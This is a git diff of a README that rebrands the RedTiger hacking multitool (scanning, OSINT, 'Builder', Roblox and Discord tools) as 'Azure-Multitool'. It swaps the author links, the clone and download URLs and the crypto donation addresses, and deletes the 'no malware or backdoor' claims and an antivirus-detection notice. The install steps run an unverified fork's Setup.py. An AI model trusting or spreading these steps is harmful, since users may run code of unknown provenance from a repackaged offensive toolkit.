@@ -6,33 +6,14 @@
    <a href="https://t.me/lowhealthgrave">Telegram</a> ・ <a href="https://redtiger.shop">Discord</a>
 </p>
 
-<p align="center">
-  <img src="https://img.shields.io/github/v/release/fluzyteck/RedTiger-Tools?label=Version&color=a80505">
-  <img src="https://img.shields.io/github/stars/fluzyteck/RedTiger-tools?style=flat&label=Stars&color=a80505">
-  <img src="https://img.shields.io/github/repo-size/fluzyteck/RedTiger-Tools?label=Size&color=a80505">
-  <img src="https://img.shields.io/github/languages/top/fluzyteck/RedTiger-Tools?color=a80505">
-</p>
-
 <p>
   
-  - Developed in <strong>Python</strong>, by <a href="https://redtiger.shop/loxy0dev">Loxy0dev</a><br>
+  - Developed in <strong>Python</strong>, by <a href="https://t.me/kisueer">kisueer</a><br>
   - Tool in <strong>English</strong>.<br>
   - Available on <strong>Windows</strong> and <strong>Linux</strong>.<br>
-  - <strong>No malware</strong> or <strong>backdoor</strong>.<br>
-  - <strong>Open Source</strong> only for verification, ensuring no malicious programs.<br>
   - <strong>Frequently updated</strong>.<br>
   - <strong>Free</strong> for everyone.<br>
   - The tools include: <strong>Scanning, Osint, Utilities, Builder, Roblox, Discord</strong>, And more..
-  <br><br>
-</p>
-
-<h1 align="center">Tools</h1>
-
-<p align="center">
-  <img src="Img/RedTiger.png" width="49%"> 
-  <img src="Img/RedTiger-2.png" width="49%"> 
-  <img src="Img/RedTiger-3.png" width="49%"> 
-  <img src="Img/Builder.png" width="49%">
   <br><br>
 </p>
 
@@ -161,7 +142,7 @@
 
 <h1 align="center">Installation</h1>
 
-<a href="https://github.com/loxy0dev/RedTiger-Tools/archive/refs/tags/v6.3.zip">Dowloads "RedTiger-Tools.zip" Here</a>
+<a href="https://github.com/kisueer/Azure-Multitool/archive/refs/heads/main.zip">Dowloads "Azure-Multitool.zip" Here</a>
 
 <p>
   
@@ -173,8 +154,8 @@
 Or
 ```
 1 - Open a terminal.
-2 - Write "git clone https://github.com/loxy0dev/RedTiger-Tools.git"
-3 - Write "cd RedTiger-Tools"
+2 - Write "git clone https://github.com/kisueer/Azure-Multitool.git"
+3 - Write "cd Azure-Multitool"
 4 - Write "git pull"
 5 - Write "python Setup.py"
 ```
@@ -185,10 +166,9 @@ Or
 
 <p>
   
-  - RedTiger Tools has been developed solely for educational purposes.<br>
+  - Azure Tools has been developed solely for educational purposes.<br>
   - This project has been created with good intentions and is intended for personal use only.<br>
-  - By choosing to use RedTiger, you acknowledge and accept full responsibility for any consequences that may result from your actions.<br>
-  - All scripts in the "<a href="https://github.com/loxy0dev/RedTiger-Tools/tree/main/Program/FileDetectedByAntivirus">Program/FileDetectedByAntivirus</a>" folder are <strong>detected by the antivirus</strong> but pose no threat to you. These are <strong>not backdoors or malware</strong>.
+
 <br><br>
 </p>
 
@@ -198,11 +178,11 @@ Or
   
   <strong>Bitcoin Adress:</strong>
   ``` 
-1MSRzopmhasr9ByHBrksScqv6wByVagDKe
+bc1qchxr244e43zztyq9a20w8jt8w6gpj95vsdudug
   ```
   <strong>Litecoin Adress:</strong>
   ```
-LXXnPk5hbUxNomJixbysoikZSv6QAiQyVQ
+LNHu1B2FGE3YCrYbswsPaP4jWtVc8RXY65
   ```
 
 </p>
